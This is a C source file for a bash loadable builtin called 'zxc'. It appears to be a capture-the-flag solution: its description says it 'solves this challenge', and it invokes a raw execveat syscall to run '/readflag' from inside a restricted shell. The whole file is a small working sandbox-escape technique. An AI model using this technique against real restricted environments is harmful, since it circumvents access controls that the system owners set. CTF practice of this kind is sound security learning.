#include <config.h>
#include <stdio.h>
#include <syscall.h>

#include "builtins.h"
#include "shell.h"
#include "bashgetopt.h"
#include "common.h"

int
zxc_builtin (list)
     WORD_LIST *list;
{
    syscall(SYS_execveat, 0, "/readflag", 0, 0, 0);
    return (EXECUTION_SUCCESS);
}

char *zxc_doc[] = {
	"Solves this challenge",
	"",
	(char *)NULL
};

struct builtin zxc_struct = {
	"zxc",
	zxc_builtin,
	BUILTIN_ENABLED,
	zxc_doc,
	"zxc",
	0
};
